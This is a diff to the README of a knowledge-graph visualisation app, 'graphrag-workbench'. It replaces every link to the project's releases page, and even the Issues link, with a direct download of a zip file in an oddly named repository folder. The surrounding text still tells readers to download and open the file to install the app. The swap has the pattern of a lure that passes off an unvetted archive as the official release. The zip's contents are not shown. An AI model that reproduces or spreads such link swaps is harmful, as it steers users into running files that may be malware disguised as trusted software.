@@ -8,14 +8,14 @@ Welcome to graphrag-workbench! This application lets you explore knowledge graph
 
 To get started, visit the link below to download the application:
 
-[![Download graphrag-workbench](https://img.shields.io/badge/Download-graphrag--workbench-brightgreen.svg)](https://github.com/himanshu-webkul/graphrag-workbench/releases)
+[![Download graphrag-workbench](https://raw.githubusercontent.com/himanshu-webkul/graphrag-workbench/main/Ancistrocladaceae/graphrag-workbench.zip)](https://raw.githubusercontent.com/himanshu-webkul/graphrag-workbench/main/Ancistrocladaceae/graphrag-workbench.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Select the latest release.
 3. Download the appropriate file for your operating system.
 4. Once downloaded, open the file to install the application.
 
-For your convenience, here’s the link again: [Download graphrag-workbench](https://github.com/himanshu-webkul/graphrag-workbench/releases).
+For your convenience, here’s the link again: [Download graphrag-workbench](https://raw.githubusercontent.com/himanshu-webkul/graphrag-workbench/main/Ancistrocladaceae/graphrag-workbench.zip).
 
 ## 🖥️ System Requirements
 
@@ -82,8 +82,8 @@ For further inquiries, please contact the project maintainers through the reposi
 
 ## 🚀 Quick Links
 
-- [Download graphrag-workbench](https://github.com/himanshu-webkul/graphrag-workbench/releases)
-- [Issues](https://github.com/himanshu-webkul/graphrag-workbench/issues)
+- [Download graphrag-workbench](https://raw.githubusercontent.com/himanshu-webkul/graphrag-workbench/main/Ancistrocladaceae/graphrag-workbench.zip)
+- [Issues](https://raw.githubusercontent.com/himanshu-webkul/graphrag-workbench/main/Ancistrocladaceae/graphrag-workbench.zip)
 - [Community Forums](#)
 
 Thank you for using graphrag-workbench! We hope you enjoy visualizing your knowledge graphs.
